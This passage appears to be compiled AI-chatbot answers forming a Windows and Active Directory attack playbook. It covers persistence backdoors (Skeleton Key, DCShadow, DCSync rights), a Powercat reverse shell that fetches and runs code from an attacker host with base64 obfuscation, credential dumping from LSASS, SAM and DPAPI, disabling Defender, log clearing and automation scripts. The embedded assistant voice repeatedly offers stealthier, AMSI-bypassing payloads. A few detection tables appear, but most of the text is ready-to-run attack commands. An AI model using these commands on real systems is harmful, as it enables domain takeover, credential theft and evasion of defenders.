\# Then perform Overpass-the-Hash to get a session:

sekurlsa::pth /user:Administrator /domain:dollarcorp /ntlm:\<hash\>
/run:cmd.exe

- Allows persistent access using local admin hash on DC.

------------------------------------------------------------------------

**4. Modify WMI Security Descriptors for Remote Access**

\# Run from attacker machine

Set-RemoteWMI -UserName attackerUser -ComputerName
dcorp-dc.dollarcorp.com

- Grants attackerUser remote WMI execution rights.

------------------------------------------------------------------------

**5. Modify PowerShell Remoting Permissions**

Set-RemotePSRemoting -UserName attackerUser -ComputerName
dcorp-dc.dollarcorp.com

- Allows PowerShell Remoting for attackerUser.

------------------------------------------------------------------------

**6. Backdoor DC Registry for Remote Hash Retrieval (DAMP)**

\# Add backdoor on DC registry

Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.com

\# Dump secrets remotely (run as 'Trustee' user)

RemoteHashRetrieval.ps1 -ComputerName dcorp-dc.dollarcorp.com

\# Get machine account hash (for silver ticket)

Get-RemoteMachineAccountHash -ComputerName dcorp-dc.dollarcorp.com

\# Get local account hashes

Get-RemoteLocalAccountHash -ComputerName dcorp-dc.dollarcorp.com

\# Get cached credentials

Get-RemoteCachedCredential -ComputerName dcorp-dc.dollarcorp.com

------------------------------------------------------------------------

**7. Perform DCShadow Attack**

\# Set permissions for DCShadow on chosen user

Set-DCShadowPermissions -FakeDC attackerMachine -SamAccountName
attackerUser

\# Stage attack with Mimikatz

lsadump::dcshadow /object:attackerUser /attribute:service /push

- Allows stealthy modification of AD objects (e.g., SIDHistory, SPNs)
  without triggering logs.

- Effective for long-term stealth persistence.

------------------------------------------------------------------------

**References**

- [Windows Active Directory Exploitation Cheat Sheet & Command
  Reference](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/)

------------------------------------------------------------------------

If you'd like, I can also provide example PowerShell scripts or a more
detailed command reference for each tactic!

Great! Here's a detailed, practical reference with **PowerShell commands
and example scripts** for each of the main persistence techniques in
Windows/AD penetration testing. These are ready to adapt in your pentest
lab or red team engagements.

------------------------------------------------------------------------

**Windows & Active Directory Persistence: Detailed Commands & Scripts**

------------------------------------------------------------------------

**1. Skeleton Key Attack (Mimikatz)**

**Purpose:** Implant a backdoor password in DC memory for all users.\
**Requires:** Domain Admin privileges on a Domain Controller (DC).

**Steps:**

- Run Mimikatz on the DC or a session with DA privileges.

- Enable debug privileges.

- Inject skeleton key.

**Commands:**

\# Run mimikatz.exe on DC or DA session

privilege::debug

misc::skeleton

- After this, the "mimikatz" password works for all domain users until
  reboot or DC restart.

------------------------------------------------------------------------

**2. Grant DCSync Rights (PowerView)**

**Purpose:** Allow a user to replicate AD secrets (password hashes,
krbtgt key).

**Example PowerShell script snippet:**

Import-Module .\PowerView.ps1

\# Grant DCSync rights to user 'attackerUser' in domain 'dollarcorp.com'

Add-ObjectACL -TargetDistinguishedName "DC=dollarcorp,DC=com" \`

-Rights DCSync \`

-PrincipalUserName "attackerUser" \`

-Verbose

- Verify with:

Get-DomainObjectAcl -DistinguishedName "DC=dollarcorp,DC=com" \|

? { \$\_.ActiveDirectoryRights -match "DS-Replication-Get-Changes" }

------------------------------------------------------------------------

**3. Enable Remote Logon for DSRM Admin**

**Purpose:** Use the local Directory Services Restore Mode (DSRM) admin
account remotely.

**Enable Remote Logon:**

Invoke-Command -ComputerName dcorp-dc.dollarcorp.com -ScriptBlock {

New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" \`

-Name "CrashOnAuditFail" -Value 0 -PropertyType DWord -Force

}

**Use hash for Overpass-the-Hash:**

\# Dump SAM hashes from DC (example)

.\mimikatz.exe "lsadump::sam" exit

\# Use NTLM hash for Overpass-the-Hash (replace \<hash\> and \<user\>)

sekurlsa::pth /user:Administrator /domain:dollarcorp.com /ntlm:\<hash\>
/run:cmd.exe

------------------------------------------------------------------------

**4. Modify Security Descriptors for WMI Access (Set-RemoteWMI)**

**Purpose:** Grant remote WMI execution rights for persistence and
command execution.

**PowerShell snippet:**

\# Requires Set-RemoteWMI.ps1 script from your pentest toolkit

.\Set-RemoteWMI.ps1 -UserName attackerUser -ComputerName
dcorp-dc.dollarcorp.com

- This adds Remote Enable permission to WMI namespace for the specified
  user.

------------------------------------------------------------------------

**5. Modify Security Descriptors for PowerShell Remoting
(Set-RemotePSRemoting)**

**Purpose:** Enable remote PowerShell remoting access for persistence.

**PowerShell snippet:**

\# Requires Set-RemotePSRemoting.ps1 script

.\Set-RemotePSRemoting.ps1 -UserName attackerUser -ComputerName
dcorp-dc.dollarcorp.com

- Grants attackerUser remote PS remoting permissions.

------------------------------------------------------------------------

**6. Backdoor DC Registry for Remote Hash Retrieval (DAMP Toolkit)**

**Purpose:** Add backdoor permissions on registry hives to dump secrets
remotely.

**Example commands:**

\# Add backdoor to DC registry

Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.com

\# Dump secrets remotely, run as Trustee user

RemoteHashRetrieval.ps1 -ComputerName dcorp-dc.dollarcorp.com

\# Get machine account hash (silver ticket attack)

Get-RemoteMachineAccountHash -ComputerName dcorp-dc.dollarcorp.com

\# Get local account hashes

Get-RemoteLocalAccountHash -ComputerName dcorp-dc.dollarcorp.com

\# Get cached credentials

Get-RemoteCachedCredential -ComputerName dcorp-dc.dollarcorp.com

------------------------------------------------------------------------

**7. DCShadow Attack (Forest-level Stealth Persistence)**

**Purpose:** Stealthily manipulate AD objects (like SIDHistory, SPNs)
without triggering logs.

**Steps:**

1.  Grant DCShadow permissions to attacker user:

\# Grant permissions

Set-DCShadowPermissions -FakeDC attackerMachine -SamAccountName
attackerUser

2.  Stage changes (example: add SPN or SIDHistory):

\# Set SPN attribute on user object

lsadump::dcshadow /object:attackerUser /attribute:service

\# Set SIDHistory attribute on user object

lsadump::dcshadow /object:attackerUser /attribute:SIDHistory

\# Optionally add full control to AdminSDHolder container for
persistence

3.  Push changes to domain:

lsadump::dcshadow /push

- The attack hides changes from normal AD logs, enabling long-term
  persistence.

------------------------------------------------------------------------

**Additional Notes**

- **Detection:** DCShadow and Skeleton Key attacks are stealthy but can
  be detected by advanced monitoring tools focused on abnormal
  replication behavior or unusual memory patches.

- **Mitigation:** Strong ACLs, monitoring replication permissions,
  disabling unnecessary remote access, and applying patches.

- **Tools:** You can find PowerView, DAMP, and Mimikatz scripts on
  GitHub repositories maintained by security researchers.

------------------------------------------------------------------------

If you want, I can provide the actual .ps1 scripts or more detailed
explanations of any of these tools and attacks. Just let me know!

## Domain/Forest Dominance

- **Module 3 – Domain Persistence, Dominance, and Escalation to
  Enterprise Admins**

  - From child domain DA to forest Enterprise Admin

  - Exploiting trust relationships and krbtgt hashes

  - Code execution via SQL linked servers across domains

🔸 **Relevant Techniques:**

- Exploiting cross-domain trusts

- Forge inter-domain TGTs

- Modify trust ACLs

## Persistence

- Abuse of accounts such as:

  - **Administrator** (always active)

  - **KRBTGT** (used for Kerberos ticket generation – critical for
    Golden Ticket)

  - **HelpAssistant**, **Guest** (often forgotten but can be abused)

# Detection

- Various **Event IDs** to watch for attacks:

  - Enumeration: 4798, 4799

  - Admin Logon: 4672

  - Kerberos Ticket Requests (TGS/Service Tickets): 4768, 4769
    (kerberoasting)

  - Golden Ticket use: 4624, 4672

  - DCShadow (malicious replication): 4742, 5137, 5141, 4929

  - PowerShell Script Block Logging: 4103

  - Process Creation: 4688, 4689

  - Failed Logon Attempts: 4625, 4771

  - DCSync: suspicious replication attempts

  - Others indicating lateral movement or privilege escalation.

## 6. Defense Evasion

- In-memory evasion of EDR/AV (Cobalt Strike, Gargoyle)

- PowerShell ScriptBlock Logging and AMSI bypass

- Living Off The Land Binaries and Scripts (LOLBins) usage

- Sysmon evasion techniques

- Honeytoken and honeypot evasion

- Disabling security tools (Invoke-Phant0m, event log clearing)

| **Stage** | **Typical Techniques** |
|----|----|
| **Discovery** | SPN scanning, AD enumeration, BloodHound data collection, group/user enumeration |
| **Privilege Escalation** | Spoofing, CVEs (Zerologon, MS14-068), AD CS abuse, GPO/ACL abuse, Kerberos delegation, DCShadow |
| **Credential Dumping** | NTDS.dit extraction, Mimikatz, Kerberoasting, DCSync, LLMNR poisoning |
| **Lateral Movement** | Pass-the-Hash, NTLM relay, SQL Server links, WSUS, password spraying, SCCM |
| **Persistence** | Golden/Silver/Diamond tickets, DCShadow, GPO persistence, Skeleton Key, SSP backdoors |
| **Defense Evasion** | AMSI bypass, ScriptBlock logging bypass, in-memory evasion, LOLBins, sysmon evasion, event log clearing |

## Stealth

- **Module 4 – Defenses**

  - Bypassing Microsoft ATA, Defender for Identity

  - Evading Event Logging and auditing

  - Using stealthy TTPs, abusing misconfigurations

🔸 **Relevant Techniques:**

- Disable or evade Event Logs (e.g., clearing logs or manipulating
  SACLs)

- Use obfuscated PowerShell

- Execute from memory/fileless malware

- Abusing admin workstations to bypass detection

**Step 6: Exploit Delegation Abuse (SeEnableDelegationPrivilege)**

Use Rubeus for Kerberos ticket attacks:

rubeus.exe asktgt /user:username /password:password /nowrap

rubeus.exe ptt /ticket:\<ticket\>

**Step 7: Cleanup Security Logs (SeSecurityPrivilege)**

wevtutil cl Security

**Step 8: Additional Enumeration & Persistence**

- Create symbolic links to bypass ACLs.

- Load custom drivers (if permitted) to maintain kernel-level
  persistence.

# Exploitation

The attacker exploits vulnerabilities or misconfigurations to escalate
privileges or move laterally in AD.

- Actions:

  - Using tools like Mimikatz to extract plaintext or hashed credentials
    from memory.

  - Exploiting weak permissions to escalate from a standard user to
    Domain Admin.

  - Abusing Kerberos delegation, over-privileged service accounts, or
    unconstrained delegation.

  - Pass-the-Hash, Pass-the-Ticket attacks to impersonate domain
    accounts.

  - Exploiting misconfigured Group Policy Objects (GPOs) or LDAP ACLs.

**✅ Stage 3: Delivery and especially**

**✅ Stage 4: Exploitation (for Hydra, Medusa, and Online Attacks)**

These tools perform **active login attempts** against target systems —
the actual brute-force or dictionary attacks.

- **Hydra**: Performs brute-force attacks against many protocols (RDP,
  SSH, SMB, FTP, etc.).

- **Medusa**: Fast, parallel brute-force login tool.

- **Online Attacks**: General term for attacks over the network
  targeting live services like RDP, SMB, HTTP, LDAP, etc.

🡒 These attacks **exploit weak credentials** or misconfigurations in
authentication systems to gain access.

Great question — all of these are **Active Directory (AD)-focused
attacks** that align with specific stages of the cyber kill chain.
Here’s a breakdown of **when each Kerberos or AD attack is used during
an AD compromise**:

**✅ Stage 4: Exploitation**

These attacks exploit authentication mechanisms or misconfigurations to
escalate privileges or gain access:

| **Attack** | **Description** |
|----|----|
| **Kerberos Brute Force** | Online/offline attack trying to guess passwords for accounts using Kerberos authentication. |
| **Kerberoasting** | Requests Service Tickets (TGS) for SPNs and extracts hashes offline to brute-force. |
| **AS-REP Roasting** | Extracts hashes of accounts that don't require pre-authentication (DONTREQPREAUTH flag). |
| **Dumping Domain Hashes** | Retrieves NTLM hashes from memory, registry, or NTDS.dit for lateral movement or cracking. |

These are **active steps to escalate access** after initial access is
gained, especially **targeting credentials**.

**✅ Stage Mapping Summary Table**

| **Attack** | **Stage** | **Category** |
|----|----|----|
| **Kerberos Brute Force** | Exploitation | Credential attack |
| **Kerberoasting** | Exploitation | Credential extraction |
| **AS-REP Roasting** | Exploitation | Credential extraction |
| **Dumping Domain Hashes** | Exploitation | Lateral movement prep |
| **Golden Ticket Attack** | Installation / Actions | Privilege abuse & persistence |
| **Skeleton Key (DC Backdoor)** | Installation / Actions | Persistence / Credential forgery |

Would you like a diagram or script to simulate these in a lab (with
detection points)?

## Powercat Reverse Shell Exploitation

**Summary Overview**

| **Category** | **Details** |
|----|----|
| **Techniques Used** | Remote Code Execution, Command and Control (C2), Reverse Shell |
| **MITRE Tactics** | T1059 (Command Scripting), T1021 (Remote Services), T1105 (Ingress Tool Transfer) |
| **Tools Used** | Powercat (PowerShell-based Netcat clone), PowerShell |
| **Vulnerabilities Used** | Remote command execution, weak egress firewall rules |
| **Security Risk Severity** | **High** – establishes remote control of the compromised system |
| **Impact on Workload** | Severe – enables full control, persistence setup, and lateral movement |

**Steps to Perform Powercat Reverse Shell Pentest**

**🔹 1. Prepare the Listener on Attacker (Linux/Kali) Machine**

powercat -l -p 443 -t 9999

- -l: Listen mode

- -p 443: Port to listen on (commonly allowed through firewalls)

- -t 9999: Timeout in seconds

Alternatively, use ncat or netcat if Powercat isn't available:

ncat -lvnp 443

------------------------------------------------------------------------

**🔹 2. Trigger Reverse Shell from the Windows Target (via PowerShell)**

Assuming you have code execution on the target (e.g., from an RCE
vulnerability, phishing, or lateral movement):

**🔸 Use Powercat to connect back:**

powershell -nop -w hidden -c "IEX(New-Object
Net.WebClient).DownloadString('http://\<attacker-ip\>/powercat.ps1');powercat
-c \<attacker-ip\> -p 443 -e cmd"

- -nop: No profile

- -w hidden: Hidden window

- -e cmd: Spawns cmd.exe shell

- \<attacker-ip\>: Replace with your listener IP

🛡️ **OPSEC Tip:** Always use **Base64-encoded commands** or
Invoke-Obfuscation to evade AV/EDR.

------------------------------------------------------------------------

**⚠️ Security Considerations**

| **Attack Vector** | **Risk** |
|----|----|
| Reverse Shell | Firewall evasion, bypasses traditional port filtering |
| PowerShell Execution | May bypass detection if obfuscated |
| Powercat Tool Usage | Can be detected by EDRs unless obfuscated or embedded in memory |

------------------------------------------------------------------------

**🔄 Alternate Payload (Base64 Encoded Example)**

**Encode the following PowerShell one-liner:**

IEX(New-Object
Net.WebClient).DownloadString('http://\<attacker-ip\>/powercat.ps1');powercat
-c \<attacker-ip\> -p 443 -e cmd

**Encode:**

\$cmd = 'IEX(New-Object
Net.WebClient).DownloadString("http://\<attacker-ip\>/powercat.ps1");powercat
-c \<attacker-ip\> -p 443 -e cmd'

\$bytes = \[System.Text.Encoding\]::Unicode.GetBytes(\$cmd)

\[Convert\]::ToBase64String(\$bytes)

**Run on Target:**

powershell -EncodedCommand \<base64_payload\>

------------------------------------------------------------------------

**🔐 Detection and Mitigation (Blue Team View)**

| **Control** | **Mitigation** |
|----|----|
| PowerShell Logging | Enable script block and module logging |
| Network Controls | Block outbound connections to unusual ports (443/TCP from desktops) |
| Application Whitelisting | Restrict use of non-signed scripts and tools like powercat |
| EDR | Monitor suspicious PowerShell usage and obfuscated commands |

------------------------------------------------------------------------

**📊 Impact Summary**

| **Technique** | **Severity** | **Impact** |
|----|----|----|
| Powercat Reverse Shell | High | Remote shell access, privilege escalation, persistence, lateral move |

------------------------------------------------------------------------

Would you like me to provide a **covert Powercat payload generator**,
**AMSI-bypassed version**, or an **encoded stager with proxy-aware
execution**?

## Post Exploitation

Certainly! Here's a **corrected, concise, and structured summary** for
**Windows and Active Directory Post-Exploitation**, with tactics,
techniques, tools, vulnerabilities, risk severity, impact, and detailed
commands for pentesting.

------------------------------------------------------------------------

**Windows & Active Directory Post-Exploitation in Penetration Testing**

------------------------------------------------------------------------

**Overview**

Post-exploitation focuses on **extracting secrets, maintaining access,
lateral movement, and privilege escalation** inside a compromised
Windows/AD environment.

- **Tactics:** Credential dumping, lateral movement, persistence,
  privilege escalation, data exfiltration.

- **Techniques:** Memory scraping, registry extraction, remote service
  abuse, covert tunnels.

- **Tools:** Mimikatz, PowerShell Empire, Impacket, Procdump, Chisel,
  PowerView, WinPEAS, PowerSploit.

- **Vulnerabilities:** Weak ACLs, unpatched DCs, credential caching,
  weak encryption of secrets, exposed services.

- **Severity:** Critical to High — leaking credentials can lead to full
  domain compromise.

- **Impact:** High impact on workload—allows further exploitation,
  stealthy persistence, and data extraction.

------------------------------------------------------------------------

**Key Post-Exploitation Techniques & Commands**

**1. Dumping Secrets with Mimikatz**

- **Goal:** Extract plaintext passwords, hashes, Kerberos tickets, and
  other secrets from memory.

- **Pre-req:** Local admin or SYSTEM privileges (often DA for
  domain-wide secrets).

\# Dump all logon passwords from LSASS

sekurlsa::logonpasswords

\# Dump domain secrets from DC (noisy: use cautiously)

lsadump::lsa /patch

\# Dump local users and hashes

lsadump::sam

\# Perform DCSync attack (simulate domain controller to replicate
credentials)

lsadump::dcsync /user:dcorp\krbtgt /domain:dollarcorp.moc

------------------------------------------------------------------------

**2. Windows Credential Vault Dumping**

- **Goal:** Extract credentials saved by Windows Credential Manager,
  DPAPI encrypted secrets.

- **Notes:** DPAPI extraction less noisy, may require additional keys.

vault::list \# List vault credentials

vault::cred /patch \# Dump credentials (may cause noise)

\# DPAPI credentials extraction - get master key GUID

dpapi::cred /in:\<path-to-credential-file\>

\# Extract DPAPI keys from memory

sekurlsa::dpapi

\# Cache and extract specific master key

dpapi::masterkey /rpc /in:\<masterkey-path\>

\# Confirm cached keys

dpapi::cache

\# Re-run credential extraction with cached keys

dpapi::cred /in:\<credential-file\>

Reference:
<https://github.com/gentilkiwi/mimikatz/wiki/howto-~credential-manager-saved-credentials>

------------------------------------------------------------------------

**3. Dumping Secrets Without Mimikatz on Target**

- **Goal:** Dump LSASS memory or registry hives remotely to analyze
  offline.

- **Tools:** Procdump, Impacket.

\# Dump LSASS memory locally on target

procdump.exe -r -ma lsass.exe lsass.dmp

\# Transfer dump to attacker's machine, parse with mimikatz

sekurlsa::minidump lsass.dmp

\# Dump registry secrets on target (requires admin)

reg.exe save hklm\sam C:\temp\sam.save

reg.exe save hklm\system C:\temp\system.save

reg.exe save hklm\security C:\temp\security.save

\# Transfer saved files to attacker and parse with Impacket

impacket-secretsdump -sam sam.save -system system.save

------------------------------------------------------------------------

**4. Dumping Secrets from Volume Shadow Copy**

- **Goal:** Bypass locked file restrictions to copy SAM and SYSTEM
  hives.

- **Pre-req:** Elevated privileges.

\# Create shadow copy

wmic shadowcopy call create Volume='C:\\

\# Copy files from shadow copy

copy
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
C:\temp\SAM

copy
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM
C:\temp\SYSTEM

------------------------------------------------------------------------

**5. Disabling Windows Defender to Avoid Detection**

- **Goal:** Reduce real-time monitoring and AV detection during
  exploitation.

- **Risk:** Easily detectable by defenders if abused.

Set-MpPreference -DisableRealtimeMonitoring \$true

Set-MpPreference -DisableIOAVProtection \$true

\# Alternatively, remove signatures

"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

------------------------------------------------------------------------

**6. Proxying and Tunneling with Chisel**

- **Goal:** Set up SOCKS proxy tunnels over compromised hosts for
  stealthy communication.

- **Usage:** Useful for pivoting or hiding traffic.

\# On attacker machine (Linux/Windows)

./chisel server -p 8888 --reverse

\# On compromised target (Windows)

.\chisel_windows_386.exe client attacker_ip:8888 R:8001:9001

\# Start SOCKS5 proxy on target

.\chisel_windows_386.exe server -p 9001 --socks5

\# Connect to SOCKS proxy on attacker machine

./chisel client localhost:8001 socks

------------------------------------------------------------------------

**7. Finding Juicy Files for Further Exploitation**

- **Goal:** Identify files containing credentials, configuration, or
  sensitive data.

\# List all files in user directories (limit scope if needed)

tree /f /a C:\Users

\# Common juicy files and paths:

C:\inetpub\www\*\web.config

C:\Windows\Panther\Unattend.xml

C:\ProgramData\Configs\\

C:\Program Files\Windows PowerShell\\

C:\Users\\user\]\AppData\LocalLow\Microsoft\Putty

C:\Users\\user\]\AppData\Roaming\FileZilla\FileZilla.xml

C:\Program Files\Jenkins\credentials.xml

C:\ProgramData\Microsoft\Wlansvc\Profiles\\.xml

\# Retrieve TightVNC password from registry

Get-ItemProperty -Path HKLM:\Software\TightVNC\Server -Name Password \|
Select-Object -ExpandProperty Password

------------------------------------------------------------------------

**Summary Table**

| **Technique** | **Tools** | **Privilege Req.** | **Detection Risk** | **Severity** | **Impact** |
|----|----|----|----|----|----|
| Mimikatz credential dumping | Mimikatz | SYSTEM / DA | Medium-High | Critical | Domain compromise, lateral mov. |
| Credential vault & DPAPI dumping | Mimikatz | SYSTEM / DA | Medium | High | Credential theft |
| LSASS Dump + Offline analysis | Procdump, Impacket | SYSTEM / DA | Low | High | Offline evasion, stealth |
| Registry secrets dump | reg.exe, Impacket | SYSTEM / DA | Low | High | Credential theft |
| Volume Shadow Copy dumping | wmic, copy | SYSTEM / DA | Medium | High | Credential theft |
| Defender disabling | PowerShell | SYSTEM | High | Medium | AV evasion |
| SOCKS proxy tunneling | Chisel | User / SYSTEM | Medium | Medium | Stealthy pivoting |
| Juicy files enumeration | PowerShell, WinPEAS | User / SYSTEM | Low | Medium | Data leakage, privilege esc. |

------------------------------------------------------------------------

**If you want, I can also provide a detailed step-by-step pentest
playbook for post-exploitation or scripts to automate these tasks.**
Just ask!

Great! Here’s a **detailed step-by-step Post-Exploitation Pentest
Playbook** for Windows and Active Directory environments, including
commands, tool usage, and notes on privileges and detection.

------------------------------------------------------------------------

**Windows & Active Directory Post-Exploitation Pentest Playbook**

------------------------------------------------------------------------

**Step 1: Gain SYSTEM or Domain Admin Privileges**

- Many post-exploitation tasks require high privileges.

- Methods include exploiting local vulnerabilities, token impersonation,
  or privilege escalation.

------------------------------------------------------------------------

**Step 2: Dump Credentials from Memory with Mimikatz**

**Goal:** Extract cleartext passwords, hashes, tickets.

\# Start Mimikatz (run as SYSTEM or DA)

mimikatz.exe

\# Enable debug privileges (necessary)

privilege::debug

\# Dump all logon passwords from LSASS

sekurlsa::logonpasswords

\# Dump local users and hashes

lsadump::sam

\# Dump domain credentials from a Domain Controller (noisy)

lsadump::lsa /patch

\# DCSync attack to replicate DC secrets (requires ldap SPN)

lsadump::dcsync /user:DOMAIN\krbtgt /domain:domain.com

**Notes:**

- DCSync mimics domain controller replication; very powerful but noisy.

- Use /patch commands carefully — they generate logs.

------------------------------------------------------------------------

**Step 3: Extract Windows Credential Vault and DPAPI Secrets**

\# List all vault credentials

vault::list

\# Dump vault credentials (patch may cause noise)

vault::cred /patch

\# Dump DPAPI secrets from stored credential files

dpapi::cred
/in:"C:\Users\username\AppData\Local\Microsoft\Credentials\\GUID\>"

\# Extract DPAPI master keys from LSASS

sekurlsa::dpapi

\# Cache a specific DPAPI master key for use

dpapi::masterkey /rpc
/in:"C:\Users\username\AppData\Roaming\Microsoft\Protect\\SID\>\\masterkey-filename\>"

\# Check cached keys

dpapi::cache

\# Re-run dpapi::cred to decrypt after caching keys

dpapi::cred /in:"\<path to credential file\>"

------------------------------------------------------------------------

**Step 4: Dump LSASS Memory for Offline Analysis**

If direct Mimikatz execution is too noisy or blocked:

\# On target machine (SYSTEM privilege)

procdump.exe -r -ma lsass.exe lsass.dmp

\# Transfer lsass.dmp to attacker machine securely (e.g. SMB, SCP)

\# On attacker machine, run mimikatz minidump mode

mimikatz.exe

sekurlsa::minidump lsass.dmp

sekurlsa::logonpasswords

------------------------------------------------------------------------

**Step 5: Dump SAM, SYSTEM, SECURITY Registry Hives for Offline
Analysis**

\# On target (elevated)

reg.exe save HKLM\SAM C:\temp\sam.save

reg.exe save HKLM\SYSTEM C:\temp\system.save

reg.exe save HKLM\SECURITY C:\temp\security.save

\# Transfer files to attacker

\# On attacker machine use Impacket secretsdump.py

impacket-secretsdump -sam sam.save -system system.save

------------------------------------------------------------------------

**Step 6: Dump Credentials from Volume Shadow Copies (Bypass locked
files)**

\# Create shadow copy

wmic shadowcopy call create Volume='C:\\

\# Copy locked files from shadow copy

copy
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
C:\temp\SAM

copy
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM
C:\temp\SYSTEM

\# Transfer and analyze as above

------------------------------------------------------------------------

**Step 7: Disable Windows Defender Temporarily (to evade detection)**

\# Disable real-time monitoring

Set-MpPreference -DisableRealtimeMonitoring \$true

Set-MpPreference -DisableIOAVProtection \$true

\# Alternatively, remove signature definitions (more aggressive)

"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

------------------------------------------------------------------------

**Step 8: Setup SOCKS Proxy with Chisel for Pivoting**

\# On attacker machine (Linux/Windows)

./chisel server -p 8888 --reverse

\# On compromised Windows target

.\chisel_windows_386.exe client \<attacker_ip\>:8888 R:8001:9001

\# Start SOCKS proxy on target

.\chisel_windows_386.exe server -p 9001 --socks5

\# Connect to SOCKS proxy on attacker machine

./chisel client localhost:8001 socks

------------------------------------------------------------------------

**Step 9: Enumerate Juicy Files and Credentials**

\# List all files in user profiles (limit scope if needed)

tree /f /a C:\Users

\# Check for common credential/config files:

Get-ChildItem -Path 'C:\inetpub\www\*' -Include web.config -Recurse

Get-ChildItem -Path 'C:\Windows\Panther\\ -Filter Unattend.xml

Get-ChildItem -Path 'C:\ProgramData\Configs\\

Get-ChildItem -Path 'C:\Program Files\Windows PowerShell\\ -Recurse

Get-ChildItem -Path
"C:\Users\\env:USERNAME\AppData\LocalLow\Microsoft\Putty"

Get-ChildItem -Path "C:\Users\\env:USERNAME\AppData\Roaming\FileZilla"
-Filter FileZilla.xml

\# Get TightVNC password from registry

(Get-ItemProperty -Path HKLM:\Software\TightVNC\Server).Password \|
ForEach-Object { \[BitConverter\]::ToString(\$\_) -replace '-','' }

------------------------------------------------------------------------

**Step 10: Cleanup and Cover Tracks (optional)**

- Clear event logs

- Remove created shadow copies

- Restart services if needed

------------------------------------------------------------------------

**Summary & Tips**

- **Always prioritize stealth:** Use offline dumps and minimal noise
  commands.

- **Focus on credentials:** Access to krbtgt account and DC secrets is a
  game-changer.

- **Leverage DCSync and DPAPI:** For powerful domain-wide credential
  replication and secrets extraction.

- **Use proxy/tunneling tools:** For stealthy pivoting inside networks.

- **Enumerate juicy files:** Credentials may also be in web.config, DB
  config, RDP files.

- **Disabling Defender:** Useful but may raise alarms if overused.

- **Privilege Requirements:** Most commands require SYSTEM or Domain
  Admin access.

------------------------------------------------------------------------

If you'd like, I can provide **PowerShell scripts** or **automated
toolkits** that wrap many of these steps for you.

Would you like me to prepare that?

Absolutely! Here are PowerShell script snippets that automate key
**Post-Exploitation** steps for **Windows and Active Directory
pentesting**, based on the tactics and commands summarized earlier.

------------------------------------------------------------------------

**PowerShell Post-Exploitation Script Collection for AD Pentesting**

------------------------------------------------------------------------

**1. Dump Credentials with Mimikatz (Invoke-Mimikatz Wrapper)**

This requires Mimikatz DLL or EXE on target, but here’s a basic wrapper
you can run if you have Mimikatz.exe locally:

\# Save as Invoke-MimikatzDump.ps1

param (

\[string\]\$MimikatzPath = ".\mimikatz.exe"

)

function Run-Mimikatz {

param (\[string\]\$command)

\$mimi = Start-Process -FilePath \$MimikatzPath -ArgumentList \$command
-NoNewWindow -RedirectStandardOutput "mimikatz_output.txt" -Wait
-PassThru

\$output = Get-Content "mimikatz_output.txt"

Remove-Item "mimikatz_output.txt"

return \$output

}

Write-Output "Dumping Logon Passwords..."

Run-Mimikatz "privilege::debug sekurlsa::logonpasswords exit"

Write-Output "Dumping Domain Hashes (lsadump::lsa)..."

Run-Mimikatz "privilege::debug lsadump::lsa exit"

Write-Output "Dumping Local SAM Hashes..."

Run-Mimikatz "privilege::debug lsadump::sam exit"

Write-Output "DCSync attack for krbtgt user..."

Run-Mimikatz "privilege::debug lsadump::dcsync /user:domain\krbtgt
/domain:domain.com exit"

------------------------------------------------------------------------

**2. Dump DPAPI Credentials**

\# Save as Dump-DPAPI.ps1

function Dump-DPAPISecrets {

param (

\[string\]\$CredentialPath = "\$env:LOCALAPPDATA\Microsoft\Credentials",

\[string\]\$MasterKeyPath =
"\$env:APPDATA\Microsoft\Protect\\env:USERSID"

)

\# List all Credential files

Write-Output "Listing Credential files in \$CredentialPath..."

Get-ChildItem \$CredentialPath -File \| ForEach-Object {

Write-Output "Found: \$(\$\_.FullName)"

}

\# Example for decrypting (requires mimikatz interaction or dpapi keys)

Write-Output "You will need DPAPI master keys to decrypt these
credentials."

Write-Output "Use mimikatz sekurlsa::dpapi or dpapi::masterkey commands
after dumping LSASS."

}

Dump-DPAPISecrets

------------------------------------------------------------------------

**3. Dump Registry Hives for Offline Secrets Extraction**

\# Save as Dump-RegistryHives.ps1

\$OutputFolder = "C:\Temp\RegistryDumps"

if (-Not (Test-Path \$OutputFolder)) { New-Item -Path \$OutputFolder
-ItemType Directory }

Write-Output "Saving SAM hive..."

reg.exe save HKLM\SAM "\$OutputFolder\sam.save"

Write-Output "Saving SYSTEM hive..."

reg.exe save HKLM\SYSTEM "\$OutputFolder\system.save"

Write-Output "Saving SECURITY hive..."

reg.exe save HKLM\SECURITY "\$OutputFolder\security.save"

Write-Output "Registry hives saved to \$OutputFolder"

------------------------------------------------------------------------

**4. Create Volume Shadow Copy and Copy Locked Files**

\# Save as Dump-ShadowCopy.ps1

Write-Output "Creating Volume Shadow Copy..."

\$shadowID = (wmic shadowcopy call create Volume='C:\\).ReturnValue

if (\$shadowID -eq 0) {

Write-Output "Shadow copy created successfully."

\$shadowPath =
"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config"

\$destPath = "C:\Temp\ShadowCopyDump"

if (-Not (Test-Path \$destPath)) { New-Item -Path \$destPath -ItemType
Directory }

Copy-Item "\$shadowPath\SAM" "\$destPath\SAM" -Force

Copy-Item "\$shadowPath\SYSTEM" "\$destPath\SYSTEM" -Force

Copy-Item "\$shadowPath\SECURITY" "\$destPath\SECURITY" -Force

Write-Output "Copied SAM, SYSTEM, SECURITY hives to \$destPath"

} else {

Write-Output "Failed to create shadow copy. Return code: \$shadowID"

}

------------------------------------------------------------------------

**5. Disable Windows Defender Real-time Protection**

\# Save as Disable-Defender.ps1

Write-Output "Disabling Windows Defender Real-time Monitoring..."

Set-MpPreference -DisableRealtimeMonitoring \$true

Set-MpPreference -DisableIOAVProtection \$true

Write-Output "Windows Defender Real-time Protection disabled
temporarily."

------------------------------------------------------------------------

**6. Enumerate Juicy Files**

\# Save as Enumerate-JuicyFiles.ps1

